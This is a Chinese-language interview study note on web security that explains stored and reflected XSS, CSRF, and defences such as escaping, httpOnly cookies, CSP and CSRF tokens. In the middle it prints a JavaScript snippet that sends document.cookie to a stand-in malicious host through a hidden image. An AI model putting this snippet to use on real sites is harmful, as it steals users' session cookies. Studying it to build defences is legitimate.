### 安全相关问题

#### 什么是XSS／CSRF？怎样防止此类安全问题

XSS和CSRF都属于跨站攻击，XSS是实现CSRF诸多途径中的一条，但不是唯一一条

xss的本质是让对方浏览器执行你插入的js ，来获取cookie等信息；csrf是借用用户的身份，向服务器发送请求

XSS分为存储型和反射型：

- 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等
- 反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS

**XSS防范**：

1. 客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行

- 移除用户上传的DOM属性，如onerror等
- 移除用户上传的style节点，script节点，iframe节点等 2）对用户输入的代码标签进行转换（html encode） 3）对url中的参数进行过滤 4）对动态输出到页面的内容进行HTML编码 5）服务端对敏感的Cookie设置 httpOnly属性，使js脚本不能读取到cookie 6) CSP 即是 Content Security Policy

```javascript
var img = document.createElement('img');
img.src='http://www.xss.com?cookie='+document.cookie;
img.style.display='none';
document.getElementsByTagName('body')[0].appendChild(img);
```
这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的`<script>`标签，这段脚本很明显就是一段xss攻击向量，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将这个拦截关闭

#### 跨站请求伪造的过程与防范：

<http://www.imooc.com/article/13552>

过程：用户小明在你的网站A上面登录了，A返回了一个session ID（使用cookie存储）,小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址，小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求，通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。

1. 使用token：服务器随机产生tooken，然后以tooken为秘钥产生一段密文，把token和密文都随cookie交给前端，前端发起请求时把密文和token交给后端，后端对token和密文进行验证，看token能不能生成同样的密文，这样即使黑客拿到了token也无法拿到密文`http://www.weibo.cn?follow_uid=123&token=73ksdkfu102`
2. 使用验证码：每一个重要的post提交页面，使用一个验证码，因为第三方网站是无法获得验证码的
3. 检测http的头信息refer。Referer记录了请求的来源地址，服务器要做的是验证这个来源地址是否合法
4. 涉及敏感操作的请求改为POST请求

---

#### 你还知道其他的Web攻击吗？



---

#### 公钥加密和私钥加密。

  一般情况下是指私钥用于对数据进行签名，公钥用于对签名进行验证;
  HTTP网站在浏览器端用公钥加密敏感数据，然后在服务器端再用私钥解密。

#### 如何确保表单提交里的密码字段不被泄露。验证码是干嘛的，是为了解决什么安全问题。

---

- [Crypto (加密)](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#crypto)
- [TLS/SSL](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#tlsssl)
- [HTTPS](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#https)
- [ XSS](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#xss)
- [ CSRF](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#csrf)
- [中间人攻击](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB)
- [Sql/Nosql 注入](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#sqlnosql-%E6%B3%A8%E5%85%A5)


- 加密是如何保证用户密码的安全性? [[more\]](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#crypto)
- TLS 与 SSL 有什么区别? [[more\]](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#tlsssl)
- HTTPS 能否被劫持? [[more\]](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#https)
- XSS 攻击是什么? 有什么危害? [[more\]](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#xss)
- 过滤 Html 标签能否防止 XSS? 请列举不能的情况? [[more\]](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#xss)
- CSRF 是什么? 如何防范? [[more\]](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#csrf)
- 如何避免中间人攻击? [[more\]](https://github.com/ElemeFE/node-interview/blob/master/sections/zh-cn/security.md#%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB)

---



